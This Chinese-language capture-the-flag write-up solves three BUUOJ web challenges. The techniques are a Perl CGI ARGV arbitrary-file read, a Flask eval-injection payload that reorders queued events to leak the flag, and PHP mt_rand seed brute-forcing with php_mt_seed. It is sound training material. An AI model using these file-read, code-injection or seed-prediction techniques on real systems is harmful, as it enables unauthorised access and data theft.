---
title: Buuoj WEB Write-up
urlname: Buuoj-WEB-Write-up
date: 2020-10-20 17:25:50
updated: 2020-11-29 18:50:50
comments: false
tags: 
  - 
categories: 
  - Write-Up
permalink: 
---

by:gyy



---

# [CSAWQual 2016]i_got_id

![image-20201129165730787](Buuoj-WEB-Write-up/image-20201129165730787.png)

咱也不懂perl...

发现了文件上传的地方

![image-20201129165825648](Buuoj-WEB-Write-up/image-20201129165825648.png)

发现会把上传的文件直接显示在网页上

查了下原理

##### perlparam()任意文件读取

```php

if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    while (<$file>) {
        print "$_";
        print "<br />";
    }
}
```

 如上代码将上传的文件原样输出到网页 

知识点： param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。 

ARGV------命令行参数

于是抓包

![image-20201129170225902](Buuoj-WEB-Write-up/image-20201129170225902.png)

修改为：

![image-20201129170548925](Buuoj-WEB-Write-up/image-20201129170548925.png)



---





# [DDCTF 2019]homebrew event loop

![image-20201129170732360](Buuoj-WEB-Write-up/image-20201129170732360.png)

source code

```python
from flask import Flask, session, request, Response
import urllib

app = Flask(__name__)
app.secret_key = '*********************'  # censored
url_prefix = '/d5afe1f66147e857'


def FLAG():
    return '*********************'  # censored


def trigger_event(event):
    session['log'].append(event)
    if len(session['log']) > 5:
        session['log'] = session['log'][-5:]
    if type(event) == type([]):
        request.event_queue += event
    else:
        request.event_queue.append(event)


def get_mid_str(haystack, prefix, postfix=None):
    haystack = haystack[haystack.find(prefix)+len(prefix):]
    if postfix is not None:
        haystack = haystack[:haystack.find(postfix)]
    return haystack


class RollBackException:
    pass


def execute_event_loop():
    valid_event_chars = set(
        'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#')
    resp = None
    while len(request.event_queue) > 0:
        # `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"
        event = request.event_queue[0]
        request.event_queue = request.event_queue[1:]
        if not event.startswith(('action:', 'func:')):
            continue
        for c in event:
            if c not in valid_event_chars:
                break
        else:
            is_action = event[0] == 'a'
            action = get_mid_str(event, ':', ';')
            args = get_mid_str(event, action+';').split('#')
            try:
                event_handler = eval(
                    action + ('_handler' if is_action else '_function'))
                ret_val = event_handler(args)
            except RollBackException:
                if resp is None:
                    resp = ''
                resp += 'ERROR! All transactions have been cancelled. <br />'
                resp += '<a href="./?action:view;index">Go back to index.html</a><br />'
                session['num_items'] = request.prev_session['num_items']
                session['points'] = request.prev_session['points']
                break
            except Exception, e:
                if resp is None:
                    resp = ''
                # resp += str(e) # only for debugging
                continue
            if ret_val is not None:
                if resp is None:
                    resp = ret_val
                else:
                    resp += ret_val
    if resp is None or resp == '':
        resp = ('404 NOT FOUND', 404)
    session.modified = True
    return resp


@app.route(url_prefix+'/')
def entry_point():
    querystring = urllib.unquote(request.query_string)
    request.event_queue = []
    if querystring == '' or (not querystring.startswith('action:')) or len(querystring) > 100:
        querystring = 'action:index;False#False'
    if 'num_items' not in session:
        session['num_items'] = 0
        session['points'] = 3
        session['log'] = []
    request.prev_session = dict(session)
    trigger_event(querystring)
    return execute_event_loop()

# handlers/functions below --------------------------------------


def view_handler(args):
    page = args[0]
    html = ''
    html += '[INFO] you have {} diamonds, {} points now.<br />'.format(
        session['num_items'], session['points'])
    if page == 'index':
        html += '<a href="./?action:index;True%23False">View source code</a><br />'
        html += '<a href="./?action:view;shop">Go to e-shop</a><br />'
        html += '<a href="./?action:view;reset">Reset</a><br />'
    elif page == 'shop':
        html += '<a href="./?action:buy;1">Buy a diamond (1 point)</a><br />'
    elif page == 'reset':
        del session['num_items']
        html += 'Session reset.<br />'
    html += '<a href="./?action:view;index">Go back to index.html</a><br />'
    return html


def index_handler(args):
    bool_show_source = str(args[0])
    bool_download_source = str(args[1])
    if bool_show_source == 'True':

        source = open('eventLoop.py', 'r')
        html = ''
        if bool_download_source != 'True':
            html += '<a href="./?action:index;True%23True">Download this .py file</a><br />'
            html += '<a href="./?action:view;index">Go back to index.html</a><br />'

        for line in source:
            if bool_download_source != 'True':
                html += line.replace('&', '&amp;').replace('\t', '&nbsp;'*4).replace(
                    ' ', '&nbsp;').replace('<', '&lt;').replace('>', '&gt;').replace('\n', '<br />')
            else:
                html += line
        source.close()

        if bool_download_source == 'True':
            headers = {}
            headers['Content-Type'] = 'text/plain'
            headers['Content-Disposition'] = 'attachment; filename=serve.py'
            return Response(html, headers=headers)
        else:
            return html
    else:
        trigger_event('action:view;index')


def buy_handler(args):
    num_items = int(args[0])
    if num_items <= 0:
        return 'invalid number({}) of diamonds to buy<br />'.format(args[0])
    session['num_items'] += num_items
    trigger_event(['func:consume_point;{}'.format(
        num_items), 'action:view;index'])


def consume_point_function(args):
    point_to_consume = int(args[0])
    if session['points'] < point_to_consume:
        raise RollBackException()
    session['points'] -= point_to_consume


def show_flag_function(args):
    flag = args[0]
    # return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.
    return 'You naughty boy! ;) <br />'


def get_flag_handler(args):
    if session['num_items'] >= 5:
        # show_flag_function has been disabled, no worries
        trigger_event('func:show_flag;' + FLAG())
    trigger_event('action:view;index')


if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0')

```

题目中有flask，网站内容和购买有关，盲猜flask session逻辑漏洞

![image-20201129174627993](Buuoj-WEB-Write-up/image-20201129174627993.png)

拿去`flask_session_cookie_manager`解密

![image-20201129174747409](Buuoj-WEB-Write-up/image-20201129174747409.png)

`{"log":[{" b":"YWN0aW9uOnZpZXc7aW5kZXg="},{" b":"YWN0aW9uOnZpZXc7aW5kZXg="}],"num_items":0,"points":3}`

base64再解密得

`{"log":[{" b":"action:view;index"},{" b":"action:view;index"}],"num_items":0,"points":3}`

分析serve.py

先找flag

![image-20201129175323407](Buuoj-WEB-Write-up/image-20201129175323407.png)

发现在get_flag_handler函数里，而条件是`session['num_items'] >= 5`

![image-20201129175427470](Buuoj-WEB-Write-up/image-20201129175427470.png)

再跳到buy_handler函数里

![image-20201129175938047](Buuoj-WEB-Write-up/image-20201129175938047.png)

关键逻辑

**num_items数目先增，然后再扣point，如果point不够再把num_items扣回去**

然后就不会了

开始分析大佬的WP

- 仔细分析execute_event_loop，会发现里面有一个eval函数，而且是可控的！ 

- 利用eval()可以导致任意命令执行，使用注释符可以 bypass 掉后面的拼接部分。 

- 若让eval()去执行trigger_event()，并且在后面跟两个命令作为参数，分别是buy和get_flag，那么buy和get_flag便先后进入队列。 

- 根据顺序会先执行buy_handler()，此时consume_point进入队列，排在get_flag之后，我们的目标达成。 

最终payload：

```
action:trigger_event%23;action:buy;5%23action:get_flag;
```

不知道编码问题？`#`必须写成 `%23`

![image-20201129181046007](Buuoj-WEB-Write-up/image-20201129181046007.png)

拿去解密得

![image-20201129181142945](Buuoj-WEB-Write-up/image-20201129181142945.png)

base64解密得

```
{"log":[{" b":"action:trigger_event#;action:buy;5#action:get_flag;"},[{" b":"action:buy;5"},{" b":"action:get_flag;"}],[{" b":"func:consume_point;5"},{" b":"action:view;index"}],{" b":"func:show_flag;flag{f0c04d65-ffa9-472b-9263-1e308ad45fd8}"},{" b":"action:view;index"}],"num_items":0,"points":3}`
```

flag即在其中



---

# [GWCTF 2019]枯燥的抽奖

![image-20201129181539620](Buuoj-WEB-Write-up/image-20201129181539620.png)

看源码有个hidden标签，直接去掉得到源码

```php
<?php
#这不是抽奖程序的源代码！不许看！
header("Content-Type: text/html;charset=utf-8");
session_start();
if(!isset($_SESSION['seed'])){
$_SESSION['seed']=rand(0,999999999);
}

mt_srand($_SESSION['seed']);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo "<p id='p1'>".$str_show."</p>";


if(isset($_POST['num'])){
    if($_POST['num']===$str){x
        echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
    }
    else{
        echo "<p id=flag>没抽中哦，再试试吧</p>";
    }
}
show_source("check.php");
```

php伪随机数爆破

用php_mt_seed

扔虚拟机里make

![image-20201129183233275](Buuoj-WEB-Write-up/image-20201129183233275.png)

然后用python脚本转化得到的数据

```python
str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
str2='uG8C1Wg91B'
str3 = str1[::-1]     # reverse
length = len(str2)    # 10
res=''
for i in range(len(str2)):
    for j in range(len(str1)):
        if str2[i] == str1[j]:
            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '
            break
print (res)
```

![image-20201129184300244](Buuoj-WEB-Write-up/image-20201129184300244.png)



然后运行`./php_mt_seed 54 54 0 61 45 45 0 61 54 54 0 61 7 7 0 61 59 59 0 61 35 35 0 61 4 4 0 61 15 15 0 61 53 53 0 61 40 40 0 61`

爆破得`394409044`

![image-20201129184626939](Buuoj-WEB-Write-up/image-20201129184626939.png)

回去跑出完整字符串

![image-20201129184942098](Buuoj-WEB-Write-up/image-20201129184942098.png)

`SJShX9epREbTBLfdc4Gu`

回去提交出flag

![image-20201129185017278](Buuoj-WEB-Write-up/image-20201129185017278.png)



----

